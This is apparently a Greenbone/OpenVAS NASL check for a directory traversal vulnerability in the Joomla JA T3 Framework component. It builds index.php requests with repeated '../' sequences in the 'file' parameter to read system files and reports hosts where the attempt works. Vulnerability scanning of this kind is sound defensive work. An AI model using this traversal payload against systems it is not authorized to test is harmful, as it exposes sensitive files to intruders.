CPE = "cpe:/a:joomla:joomla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902672" );
	script_version( "2021-08-06T11:34:45+0000" );
	script_bugtraq_id( 53039 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-04-25 17:38:13 +0530 (Wed, 25 Apr 2012)" );
	script_name( "Joomla! JA T3 Framework Component Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://1337day.com/exploits/18065" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/74909" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/111906/Joomla-JA-T3-Framework-Directory-Traversal.html" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "joomla_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "joomla/installed" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to read arbitrary files via
directory traversal attacks and gain sensitive information." );
	script_tag( name: "affected", value: "Joomla! JA T3 Framework Component" );
	script_tag( name: "insight", value: "The flaw is due to an improper validation of user supplied input passed in
'file' parameter to the 'index.php', which allows attackers to read arbitrary files via a ../(dot dot)
sequences." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Joomla! JA T3 Framework component and is prone to
directory traversal vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/index.php?file=" + crap( data: "../", length: 3 * 15 ) + files[file] + "&jat3action=gzip&type=css&v=1";
	if(http_vuln_check( port: port, url: url, pattern: file, check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

